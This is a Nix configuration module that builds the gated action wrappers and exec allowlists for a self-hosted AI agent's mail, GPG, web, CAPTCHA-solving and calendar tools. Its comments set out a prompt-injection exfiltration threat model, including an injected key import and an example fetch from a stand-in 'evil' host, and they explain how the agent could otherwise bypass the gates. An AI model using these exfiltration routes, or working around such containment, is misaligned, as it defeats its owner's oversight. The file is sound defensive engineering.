# The agent's action surface: the wrapper binaries behind each my.openclaw
# .instances.<name>.actions/mail capability (mail read/send, GPG, outbox,
# trusted URL/mail, image, weather, captcha, Zotero, calendar, invites), plus
# the allowlist entries that clear them through the exec gate. Split out of
# ./instance.nix, which inherits what it needs from here.
{
  config,
  lib,
  pkgs,
  cfg,
  name,
  icfg,
  stateDir,
}:

let
  # --- optional email capability (see options.my.openclaw.mail) --------------
  # Read-only mblaze Maildir tools — display, inspect, search, sort/thread and
  # navigate the message sequence; none write to the Maildir, send, or hit the
  # network, so they are safe to run unprompted. NB: the exec gate splits a
  # command into pipeline/chain segments and clears each one independently (it
  # must satisfy `segments.every(...)`), so a pipeline of these read bins — e.g.
  # `mlist | mscan` — runs unprompted because every segment is a safeBin. A
  # prompt is raised only when SOME segment is not itself a safeBin/allowlisted,
  # or the command uses a form that fails analysis (inline-eval like `sh -c`/
  # `python -c` under exec.strictInlineEval, line continuations, etc.).
  mailReadBins = [
    "mscan"
    "mshow"
    "mlist"
    "mhdr"
    "mdirs"
    "mseq"
    "mthread"
    "msort"
    "maddr"
    "magrep"
    "mmime"
    "mpick"
    "mflow"
    "mdate"
  ];

  # Local Maildir MUTATION tools, blessed only when icfg.mail.manageMaildir is on
  # (the owner opts the agent into managing its OWN mailbox). Each edits the
  # local Maildir but neither sends nor fetches over the network, so admitting
  # them stays within the "local mutation, no network" tier: mflag (set/unset
  # flags — read/unread/flagged/trashed), mrefile (move messages between
  # mailboxes), mmkdir (create a mailbox), minc (incorporate new mail), mdeliver
  # (deliver/export a message into a maildir). STILL DELIBERATELY EXCLUDED even
  # when this is on: mcom/mrep/mfwd/mbnc/msuck/mblow (send or fetch over the
  # network — the only blessed outbound path is the recipient-gated send-email),
  # msed (rewrites message content in place, sed -i-style), and mless/mquote
  # (interactive pager / reply-compose helper) — those keep prompting.
  mailManageBins = [
    "mflag"
    "mrefile"
    "mmkdir"
    "minc"
    "mdeliver"
  ];

  # `send-email`: the generic actions/send-email script wrapped so the sender
  # identity ($MAIL_FROM, from icfg.mail.fromAddress) and the sendmail path are
  # pinned by nix — the script itself stays identity-agnostic. Immutable in the
  # store, and the wrapper --set overrides any inherited env, so the agent can
  # neither swap the code nor change the sender. The bin name carries no agent
  # name.
  mailSendBin =
    let
      wrapArgs = [
        "--set SENDMAIL /run/wrappers/bin/sendmail"
      ]
      # Confidential recipients are refused here (see mail.gpg): being on the
      # unprompted list does not make a cleartext send to them acceptable.
      ++ encryptOnlyWrapArgs
      ++ lib.optional (
        icfg.mail.fromAddress != null
      ) "--set MAIL_FROM ${lib.escapeShellArg icfg.mail.fromAddress}"
      ++ lib.optional (icfg.fullName != "") "--set MAIL_FROM_NAME ${lib.escapeShellArg icfg.fullName}"
      # With a submit user, a recipient outside the unprompted set is HELD in
      # the outbox for the owner instead of sent (see submitUser below).
      ++ lib.optionals (submitUser != null) (
        [
          "--set OUTBOX ${outboxDir}"
          "--set UNPROMPTED_ADDRESSES ${lib.escapeShellArg (lib.concatStringsSep " " icfg.mail.unpromptedRecipients)}"
        ]
        ++ lib.optional (
          icfg.mail.unpromptedRecipientsFile != null
        ) "--set UNPROMPTED_FILE ${icfg.mail.unpromptedRecipientsFile}"
      );
    in
    pkgs.runCommandLocal "openclaw-send-email" { nativeBuildInputs = [ pkgs.makeWrapper ]; } ''
      install -Dm0755 ${./actions/send-email} $out/libexec/send-email
      makeWrapper $out/libexec/send-email $out/bin/send-email \
        ${lib.concatStringsSep " \\\n  " wrapArgs}
    '';

  # One exact allowlist rule per pre-blessed recipient: `send-email <addr>`. Any
  # other recipient (or more than one in a single send) fails to match and falls
  # through to the exec `ask` gate — the data-exfiltration guard.
  mailAllowlist = map (addr: "send-email ${addr}") icfg.mail.unpromptedRecipients;

  # How the agent's own identity is shown to it in the skills — the same string
  # a recipient sees, so `From:` in the skill matches `From:` in the mailbox.
  mailFromDisplay =
    if icfg.mail.fromAddress == null then
      "the agent's configured address"
    else if icfg.fullName == "" then
      icfg.mail.fromAddress
    else
      "${icfg.fullName} <${icfg.mail.fromAddress}>";

  # --- confidential mail (OpenPGP) — see options.my.openclaw.mail.gpg -------
  gpgCfg = icfg.mail.gpg;
  gpgEnabled = icfg.mail.enable && gpgCfg.enable;

  # The keyring lives in the SERVICE state dir rather than the agent's ~/.gnupg,
  # and is rebuilt from nix on every start (see gpgSeed). That is what keeps it
  # CLOSED: a key the agent imports at runtime — the obvious move for an
  # injection that wants to encrypt an exfil copy to itself — does not survive a
  # restart, and cannot be selected in the meantime because both wrappers name
  # keys by pinned fingerprint rather than by address.
  gnupgHome = "${stateDir}/gnupg";

  # Flags shared by the seed and both wrappers. Every network path gpg has is
  # off (no dirmngr, no keyserver, no opportunistic import), so the keyring can
  # only ever hold what nix put in it.
  gpgFlags = lib.concatStringsSep " " [
    "--batch"
    "--no-tty"
    "--quiet"
    "--homedir ${gnupgHome}"
    "--disable-dirmngr"
    "--no-auto-key-locate"
    "--no-auto-key-import"
    "--keyserver-options no-auto-key-retrieve"
  ];

  # `address=fingerprint` pairs for send-encrypted-mail (addresses lowercased
  # here so the script's comparison is a plain string match).
  gpgEncryptKeys = lib.concatStringsSep " " (
    map (k: "${lib.toLower k.address}=${k.fingerprint}") gpgCfg.keys
  );

  # Fingerprints decrypt-mail will accept as a trusted signer on inbound mail.
  gpgTrustedSigners = lib.concatStringsSep " " (map (k: k.fingerprint) gpgCfg.keys);

  # Addresses the PLAINTEXT senders must refuse. This is the fail-closed half of
  # the design: confidentiality is a property of the recipient, fixed in nix, so
  # there is no cleartext fallback for the agent to be argued into.
  gpgEncryptOnly = lib.concatStringsSep " " (
    map (k: lib.toLower k.address) (lib.filter (k: k.requireEncryption) gpgCfg.keys)
  );

  # Pinned into send-email/send-trusted-mail only when the feature is on, so an
  # instance without gpg keeps exactly its previous behaviour.
  encryptOnlyWrapArgs = lib.optional gpgEnabled "--set ENCRYPT_ONLY_ADDRESSES ${lib.escapeShellArg gpgEncryptOnly}";

  # `send-encrypted-mail`: the generic actions/send-encrypted-mail script wrapped
  # so the keyring, the gpg binary and the pinned recipient keys come from nix.
  # Self-gating twice over — it refuses any recipient without a pinned key, and
  # has no code path that emits cleartext — so it is safe to bless whole-binary
  # in safeBins. NB: gnupg goes on the WRAPPER's PATH only (gpg-agent/gpgconf
  # need to be resolvable), never on the agent's, so raw `gpg` stays unavailable.
  encryptedMailBin =
    let
      wrapArgs = [
        "--set SENDMAIL /run/wrappers/bin/sendmail"
        "--set GPG ${pkgs.gnupg}/bin/gpg"
        "--set GNUPGHOME ${gnupgHome}"
        "--set ENCRYPT_KEYS ${lib.escapeShellArg gpgEncryptKeys}"
        "--prefix PATH : ${
          lib.makeBinPath [
            pkgs.gnupg
            pkgs.coreutils
          ]
        }"
      ]
      ++ lib.optional (
        gpgCfg.fingerprint != null
      ) "--set SIGN_KEY ${lib.escapeShellArg gpgCfg.fingerprint}"
      ++ lib.optional (
        icfg.mail.fromAddress != null
      ) "--set MAIL_FROM ${lib.escapeShellArg icfg.mail.fromAddress}"
      ++ lib.optional (icfg.fullName != "") "--set MAIL_FROM_NAME ${lib.escapeShellArg icfg.fullName}";
    in
    pkgs.runCommandLocal "openclaw-send-encrypted-mail" { nativeBuildInputs = [ pkgs.makeWrapper ]; } ''
      install -Dm0755 ${./actions/send-encrypted-mail} $out/libexec/send-encrypted-mail
      makeWrapper $out/libexec/send-encrypted-mail $out/bin/send-encrypted-mail \
        ${lib.concatStringsSep " \\\n  " wrapArgs}
    '';

  # `decrypt-mail`: read-only and destination-less (it opens a file the agent can
  # already read and reaches no network), so it is safe to bless whole-binary. It
  # reports the signature verdict against the pinned signer set; deciding what a
  # verdict permits is the skill's job, not the wrapper's.
  decryptMailBin =
    pkgs.runCommandLocal "openclaw-decrypt-mail" { nativeBuildInputs = [ pkgs.makeWrapper ]; }
      ''
        install -Dm0755 ${./actions/decrypt-mail} $out/libexec/decrypt-mail
        makeWrapper $out/libexec/decrypt-mail $out/bin/decrypt-mail \
          --set GPG ${pkgs.gnupg}/bin/gpg \
          --set GNUPGHOME ${gnupgHome} \
          --set TRUSTED_SIGNERS ${lib.escapeShellArg gpgTrustedSigners} \
          --prefix PATH : ${
            lib.makeBinPath [
              pkgs.gnupg
              pkgs.coreutils
            ]
          }
      '';

  # Rebuild the keyring from nix at every start: kill any agent left over from
  # the previous run, wipe the home, re-import the agent's own secret key from
  # the systemd credential and each owner public key from the store. Fail-closed
  # throughout — a missing or unreadable secret key leaves a keyring that cannot
  # decrypt or sign, which stops confidential mail rather than downgrading it.
  gpgSeed = lib.optionalString gpgEnabled ''
    ${pkgs.gnupg}/bin/gpgconf --homedir ${gnupgHome} --kill gpg-agent >/dev/null 2>&1 || true
    rm -rf ${gnupgHome}
    install -d -m 00700 ${gnupgHome} # 00: drop the inherited setgid (see skillsStageSeed)
    if [ -r "''${CREDENTIALS_DIRECTORY:-}/mail-gpg-key" ]; then
      ${pkgs.gnupg}/bin/gpg ${gpgFlags} --import "''${CREDENTIALS_DIRECTORY}/mail-gpg-key" \
        || echo "[openclaw] WARN: could not import the agent's OpenPGP secret key; confidential mail fails closed" >&2
    else
      echo "[openclaw] WARN: no OpenPGP secret key available (mail.gpg.secretKeyFile); confidential mail fails closed" >&2
    fi
    ${lib.concatMapStrings (k: ''
      ${pkgs.gnupg}/bin/gpg ${gpgFlags} --import ${k.publicKeyFile} \
        || echo "[openclaw] WARN: could not import the OpenPGP public key for ${k.address}" >&2
    '') gpgCfg.keys}
    ${pkgs.gnupg}/bin/gpgconf --homedir ${gnupgHome} --kill gpg-agent >/dev/null 2>&1 || true
  '';

  # `request-trusted-url`: the generic actions/request-trusted-url script wrapped
  # so the allowed-host globs ($TRUSTED_SITES) and the curl binary ($CURL) are
  # pinned by nix — the script stays generic and the agent cannot widen the host
  # set or swap the code. Self-gating (refuses any non-trusted host), so it is
  # safe to bless whole-binary in safeBins.
  requestUrlBin =
    pkgs.runCommandLocal "openclaw-request-trusted-url" { nativeBuildInputs = [ pkgs.makeWrapper ]; }
      ''
        install -Dm0755 ${./actions/request-trusted-url} $out/libexec/request-trusted-url
        makeWrapper $out/libexec/request-trusted-url $out/bin/request-trusted-url \
          --set CURL ${lib.getExe pkgs.curl} \
          --set TRUSTED_SITES ${lib.escapeShellArg (lib.concatStringsSep " " icfg.actions.requestUrl.trustedSites)}
      '';

  # `send-trusted-mail`: the generic actions/send-trusted-mail script wrapped so
  # the trusted recipient set ($TRUSTED_ADDRESSES), the sender ($MAIL_FROM) and
  # sendmail ($SENDMAIL) are pinned by nix. Self-gating (refuses any non-trusted
  # recipient), so it is safe to bless whole-binary in safeBins.
  trustedMailBin =
    let
      wrapArgs = [
        "--set SENDMAIL /run/wrappers/bin/sendmail"
        "--set TRUSTED_ADDRESSES ${lib.escapeShellArg (lib.concatStringsSep " " icfg.actions.trustedMail.trustedAddresses)}"
      ]
      ++ lib.optional (
        icfg.actions.trustedMail.trustedAddressesFile != null
      ) "--set TRUSTED_ADDRESSES_FILE ${icfg.actions.trustedMail.trustedAddressesFile}"
      ++ encryptOnlyWrapArgs
      ++ lib.optional (
        icfg.mail.fromAddress != null
      ) "--set MAIL_FROM ${lib.escapeShellArg icfg.mail.fromAddress}"
      ++ lib.optional (icfg.fullName != "") "--set MAIL_FROM_NAME ${lib.escapeShellArg icfg.fullName}";
    in
    pkgs.runCommandLocal "openclaw-send-trusted-mail" { nativeBuildInputs = [ pkgs.makeWrapper ]; } ''
      install -Dm0755 ${./actions/send-trusted-mail} $out/libexec/send-trusted-mail
      makeWrapper $out/libexec/send-trusted-mail $out/bin/send-trusted-mail \
        ${lib.concatStringsSep " \\\n  " wrapArgs}
    '';

  # `generate-image`: the generic actions/generate-image script wrapped so the
  # model, token-file path, optional reference image, API base and tool paths are
  # all pinned by nix — the script stays generic and the agent cannot swap the
  # code, the model, or the endpoint. Destination-pinned (always the configured
  # generateContent endpoint), so it is safe to bless whole-binary in safeBins:
  # the only agent-controlled inputs are the prompt and the output path (in its
  # own tree). NB: the API key stays a runtime FILE (tokenFile) — never a nix
  # value — so it does not enter the store or this public repo.
  generateImageBin =
    pkgs.runCommandLocal "openclaw-generate-image" { nativeBuildInputs = [ pkgs.makeWrapper ]; }
      ''
        install -Dm0755 ${./actions/generate-image} $out/libexec/generate-image
        makeWrapper $out/libexec/generate-image $out/bin/generate-image \
          --prefix PATH : ${
            lib.makeBinPath [
              pkgs.curl
              pkgs.jq
              pkgs.coreutils
            ]
          } \
          --set GENIMG_MODEL ${lib.escapeShellArg icfg.actions.generateImage.model} \
          --set GENIMG_TOKEN_FILE ${lib.escapeShellArg icfg.actions.generateImage.tokenFile} \
          ${
            lib.optionalString (
              icfg.actions.generateImage.referenceImage != null
            ) "--set GENIMG_DEFAULT_REFERENCE ${lib.escapeShellArg icfg.actions.generateImage.referenceImage}"
          } \
          ${
            lib.optionalString (
              icfg.actions.generateImage.referenceRoot != null
            ) "--set GENIMG_REFERENCE_ROOT ${lib.escapeShellArg icfg.actions.generateImage.referenceRoot}"
          } \
          ${lib.optionalString (
            icfg.actions.generateImage.apiBase != null
          ) "--set GENIMG_API_BASE ${lib.escapeShellArg icfg.actions.generateImage.apiBase}"}
      '';

  # `check-weather`: the generic actions/check-weather script wrapped so the API
  # key file, units, language, default location and endpoint are pinned by nix.
  # Destination-fixed (always the configured OpenWeatherMap endpoint), so it is
  # safe to bless whole-binary in safeBins. The API key stays a runtime FILE
  # (tokenFile), never a nix value.
  checkWeatherBin =
    pkgs.runCommandLocal "openclaw-check-weather" { nativeBuildInputs = [ pkgs.makeWrapper ]; }
      ''
        install -Dm0755 ${./actions/check-weather} $out/libexec/check-weather
        makeWrapper $out/libexec/check-weather $out/bin/check-weather \
          --prefix PATH : ${
            lib.makeBinPath [
              pkgs.curl
              pkgs.jq
              pkgs.coreutils
            ]
          } \
          --set WEATHER_TOKEN_FILE ${lib.escapeShellArg icfg.actions.checkWeather.tokenFile} \
          --set WEATHER_UNITS ${lib.escapeShellArg icfg.actions.checkWeather.units} \
          --set WEATHER_LANG ${lib.escapeShellArg icfg.actions.checkWeather.lang} \
          ${
            lib.optionalString (
              icfg.actions.checkWeather.defaultLocation != null
            ) "--set WEATHER_DEFAULT_LOCATION ${lib.escapeShellArg icfg.actions.checkWeather.defaultLocation}"
          } \
          ${lib.optionalString (
            icfg.actions.checkWeather.apiBase != null
          ) "--set WEATHER_API_BASE ${lib.escapeShellArg icfg.actions.checkWeather.apiBase}"}
      '';

  # `solve-captcha`: the generic actions/solve-captcha script wrapped so the API
  # key file, the endpoint, the allowed page hosts, the image root and the
  # timeouts are pinned by nix — the script stays generic and the agent can
  # neither swap the code nor widen the host set. Destination-pinned (always the
  # configured 2Captcha endpoint) AND self-gating on the page host, so it is safe
  # to bless whole-binary. Two properties keep it from becoming an outbound
  # channel: the wrapper BUILDS the task JSON itself from flags (only the
  # "…Proxyless" task types exist for the agent, so no proxy/UA/cookie fields can
  # be smuggled in and the farm cannot be used as a relay), and the page URL must
  # match allowedSites. What the agent does control — the page URL, the site key
  # and an image body — is low-bandwidth and goes only to 2Captcha; the image is
  # additionally confined to its own tree. NB: the API key stays a runtime FILE
  # (tokenFile), never a nix value, so it does not enter the store or this repo.
  solveCaptchaBin =
    pkgs.runCommandLocal "openclaw-solve-captcha" { nativeBuildInputs = [ pkgs.makeWrapper ]; }
      ''
        install -Dm0755 ${./actions/solve-captcha} $out/libexec/solve-captcha
        makeWrapper $out/libexec/solve-captcha $out/bin/solve-captcha \
          --prefix PATH : ${
            lib.makeBinPath [
              pkgs.curl
              pkgs.jq
              pkgs.coreutils
            ]
          } \
          --set CAPTCHA_TOKEN_FILE ${lib.escapeShellArg icfg.actions.solveCaptcha.tokenFile} \
          --set CAPTCHA_ALLOWED_SITES ${lib.escapeShellArg (lib.concatStringsSep " " icfg.actions.solveCaptcha.allowedSites)} \
          --set CAPTCHA_TIMEOUT ${toString icfg.actions.solveCaptcha.timeoutSeconds} \
          --set CAPTCHA_POLL_INTERVAL ${toString icfg.actions.solveCaptcha.pollIntervalSeconds} \
          ${
            lib.optionalString (
              icfg.actions.solveCaptcha.imageRoot != null
            ) "--set CAPTCHA_IMAGE_ROOT ${lib.escapeShellArg icfg.actions.solveCaptcha.imageRoot}"
          } \
          ${
            lib.optionalString (
              icfg.actions.solveCaptcha.softId != null
            ) "--set CAPTCHA_SOFT_ID ${lib.escapeShellArg icfg.actions.solveCaptcha.softId}"
          } \
          ${lib.optionalString (
            icfg.actions.solveCaptcha.apiBase != null
          ) "--set CAPTCHA_API_BASE ${lib.escapeShellArg icfg.actions.solveCaptcha.apiBase}"}
      '';

  # `check-zotero` / `zotero-add`: the agent's WHOLE Zotero surface, as two names
  # over one script so the role is legible in the command itself — `check-*` is
  # already this module's read prefix (check-calendar, check-weather,
  # check-email), and the exec gate is per-binary, so read and write stay
  # separately governable.
  #
  # The read half is not a convenience. The alternative — letting the agent call
  # `request-trusted-url ".../items?key=<key>&q=…"` — only works if the agent
  # KNOWS the key, which puts it in a command line the agent composed and thus in
  # its transcript, exec log and memory index. Here the wrapper reads the key from
  # a file and injects it as a header, so it never enters anything the agent
  # writes; api.zotero.org is correspondingly NOT in trustedSites.
  #
  # Both names are destination-pinned (the agent supplies query text or item data,
  # never a URL) and the library is the one the key owns. `zotero-add` refuses any
  # item carrying `key`/`version` — what a Zotero UPDATE looks like — and never
  # issues DELETE, so it can create references and nothing else. That is what
  # makes both safe to bless whole-binary despite one of them being a write. The
  # API key stays a runtime FILE (tokenFile), never a nix value.
  zoteroBin =
    let
      wrapArgs = [
        "--prefix PATH : ${
          lib.makeBinPath [
            pkgs.curl
            pkgs.jq
            pkgs.coreutils
          ]
        }"
        "--set ZOTERO_TOKEN_FILE ${lib.escapeShellArg icfg.actions.zotero.tokenFile}"
        "--set ZOTERO_MAX_ITEMS ${toString icfg.actions.zotero.maxItems}"
      ]
      ++ lib.optional (
        icfg.actions.zotero.library != null
      ) "--set ZOTERO_LIBRARY ${lib.escapeShellArg icfg.actions.zotero.library}"
      ++ lib.optional (
        icfg.actions.zotero.apiBase != null
      ) "--set ZOTERO_API_BASE ${lib.escapeShellArg icfg.actions.zotero.apiBase}";
      wrapped = lib.concatStringsSep " \\\n  " wrapArgs;
    in
    pkgs.runCommandLocal "openclaw-zotero" { nativeBuildInputs = [ pkgs.makeWrapper ]; } ''
      install -Dm0755 ${./actions/zotero} $out/libexec/zotero
      makeWrapper $out/libexec/zotero $out/bin/check-zotero \
        --set ZOTERO_ROLE read \
        ${wrapped}
      makeWrapper $out/libexec/zotero $out/bin/zotero-add \
        --set ZOTERO_ROLE add \
        ${wrapped}
    '';

  # `check-calendar`: list upcoming events from an .ics calendar (python +
  # icalendar + recurring-ical-events). It takes the calendar SOURCE directly
  # — an https:// URL (fetched by DELEGATING to request-trusted-url, so the
  # fetch inherits the exact same trusted-host allowlist, GET-only method and
  # no-redirect policy — no new outbound surface), or a local .ics file /
  # stdin (parsed offline). Safe to bless whole-binary: local parsing is
  # network-free, and the only network path is the already-hardened,
  # host-gated request-trusted-url binary baked into its PATH below. This
  # collapses the old two-segment `request-trusted-url <url> | parse-ics`
  # pipe into one command (which the exec gate prefers).
  checkCalendarPython = pkgs.python3.withPackages (ps: [
    ps.icalendar
    ps.recurring-ical-events
  ]);
  checkCalendarBin =
    pkgs.runCommandLocal "openclaw-check-calendar" { nativeBuildInputs = [ pkgs.makeWrapper ]; }
      ''
        install -Dm0755 ${./actions/check-calendar} $out/libexec/check-calendar
        makeWrapper $out/libexec/check-calendar $out/bin/check-calendar \
          --prefix PATH : ${
            lib.makeBinPath [
              checkCalendarPython
              requestUrlBin
            ]
          }
      '';

  # `make-invite`: composes an iTIP calendar invitation on stdout — it does NOT
  # send. The agent redirects it into one of the EXISTING senders
  # (`send-trusted-mail addr < invite.eml`, or `send-email addr < invite.eml`),
  # so an invitation is gated by exactly the recipient rules already in force
  # and no second self-limiting sender has to be kept in step with the trusted
  # list. Composing text reaches no network and has no destination, so this is
  # safe whole-binary. The identity is pinned here, not passed as an argument:
  # the ORGANIZER must match the From: the mail finally goes out with, and both
  # now come from the same MAIL_FROM/MAIL_FROM_NAME pair.
  makeInviteBin =
    let
      wrapArgs = [
        "--prefix PATH : ${lib.makeBinPath [ pkgs.coreutils ]}"
      ]
      ++ lib.optional (
        icfg.mail.fromAddress != null
      ) "--set MAIL_FROM ${lib.escapeShellArg icfg.mail.fromAddress}"
      ++ lib.optional (icfg.fullName != "") "--set MAIL_FROM_NAME ${lib.escapeShellArg icfg.fullName}";
    in
    pkgs.runCommandLocal "openclaw-make-invite" { nativeBuildInputs = [ pkgs.makeWrapper ]; } ''
      install -Dm0755 ${./actions/make-invite} $out/libexec/make-invite
      makeWrapper $out/libexec/make-invite $out/bin/make-invite \
        ${lib.concatStringsSep " \\\n  " wrapArgs}
    '';

  # `offline CMD …`: run CMD in a throwaway user+network namespace with NO
  # network interfaces (only a down `lo`), so a network-capable tool cannot reach
  # anything off-box regardless of its arguments — the fail-safe way to bless
  # converters like ffmpeg/pandoc/xmllint unprompted without reopening a data-
  # exfil channel (`offline ffmpeg -i http://evil/…` simply cannot connect). It
  # only ever REMOVES capability, and the unprivileged userns needs no setuid.
  # The bare tool (no `offline` prefix) stays gated. See exec.netIsolatedBins.
  offlineLauncher = pkgs.writeShellScriptBin "offline" ''
    exec ${pkgs.util-linux}/bin/unshare --user --map-root-user --net -- "$@"
  '';

  # Full-command globs blessing `offline <bin> …` for each netIsolatedBin, so the
  # network-isolated form runs unprompted while the bare binary keeps prompting.
  netIsolateAllowlist = map (b: "offline ${b}*") icfg.exec.netIsolatedBins;

  # The self-gating action wrappers (plus mblaze's mlist/mscan/… Maildir tools)
  # that the agent invokes BY NAME. They must live in TWO places:
  #   (1) environment.systemPackages below — so OpenClaw's safe-bin trust check,
  #       which only honors binaries it resolves from the system profile
  #       (/run/current-system/sw/bin), treats them as blessed; and
  #   (2) the service `path` below — so the agent's OWN shell can resolve them.
  #       Under the claude-cli runtime the agent's Bash tool runs `bash -c` with
  #       exactly the service PATH (the system profile is NOT on it), so a wrapper
  #       shipped to only (1) is trusted-but-unresolvable: `generate-image` existed
  #       in the store yet "was not on the agent's PATH". Same belt-and-braces
  #       reasoning already applied to icfg.extraPackages.
  # NB: ffmpeg-headless (STT) is deliberately NOT here — it is resolved via
  # requireSystemBin and belongs in systemPackages ONLY (see below).
  # --- mail through a separate account (mail.submitUser) ------------------
  # Nothing gates a command under the claude-cli runtime, so a send wrapper
  # that runs AS the agent is no boundary: the agent could call sendmail
  # itself. With a submit user the real wrappers run as THAT account through
  # sudo, the host refuses the agent's own account mail submission
  # (my.mail-server.deniedSubmitUsers), and the wrappers are the only way out.
  submitUser = icfg.mail.submitUser;
  outboxDir = "/var/spool/openclaw-outbox/${name}";

  # What the agent finds on its PATH under the real wrapper's name.
  viaSubmitUser =
    bin: binName:
    pkgs.writeShellScriptBin binName ''
      exec /run/wrappers/bin/sudo -n -u ${submitUser} ${bin}/bin/${binName} "$@"
    '';

  # Root's side of the outbox: list, read, release or drop held mail.
  outboxBin =
    pkgs.runCommandLocal "openclaw-outbox-${name}" { nativeBuildInputs = [ pkgs.makeWrapper ]; }
      ''
        install -Dm0755 ${./actions/outbox} $out/libexec/openclaw-outbox
        makeWrapper $out/libexec/openclaw-outbox $out/bin/openclaw-outbox-${name} \
          --set OUTBOX ${outboxDir} \
          --set SUBMIT_USER ${submitUser} \
          --set SENDMAIL /run/wrappers/bin/sendmail \
          ${
            lib.optionalString (
              icfg.mail.fromAddress != null
            ) "--set MAIL_FROM ${lib.escapeShellArg icfg.mail.fromAddress}"
          } \
          ${
            lib.optionalString (icfg.fullName != "") "--set MAIL_FROM_NAME ${lib.escapeShellArg icfg.fullName}"
          } \
          --prefix PATH : ${
            lib.makeBinPath [
              pkgs.coreutils
              pkgs.gnugrep
              pkgs.util-linux
            ]
          }
      '';

  actionWrapperBins =
    lib.optionals icfg.mail.enable [
      (if submitUser != null then viaSubmitUser mailSendBin "send-email" else mailSendBin)
      pkgs.mblaze
    ]
    ++ lib.optionals gpgEnabled [
      encryptedMailBin
      decryptMailBin
    ]
    ++ lib.optionals icfg.actions.requestUrl.enable [ requestUrlBin ]
    ++ lib.optionals icfg.actions.trustedMail.enable [
      (if submitUser != null then viaSubmitUser trustedMailBin "send-trusted-mail" else trustedMailBin)
    ]
    ++ lib.optionals icfg.actions.generateImage.enable [ generateImageBin ]
    ++ lib.optionals icfg.actions.checkWeather.enable [ checkWeatherBin ]
    ++ lib.optionals icfg.actions.checkCalendar.enable [ checkCalendarBin ]
    ++ lib.optionals icfg.actions.makeInvite.enable [ makeInviteBin ]
    ++ lib.optionals icfg.actions.solveCaptcha.enable [ solveCaptchaBin ]
    ++ lib.optionals icfg.actions.zotero.enable [ zoteroBin ]
    ++ lib.optional (icfg.exec.netIsolatedBins != [ ]) offlineLauncher;
in
{
  inherit
    actionWrapperBins
    gpgCfg
    gpgEnabled
    gpgSeed
    mailAllowlist
    mailFromDisplay
    mailManageBins
    mailReadBins
    mailSendBin
    netIsolateAllowlist
    outboxBin
    outboxDir
    submitUser
    trustedMailBin
    ;
}
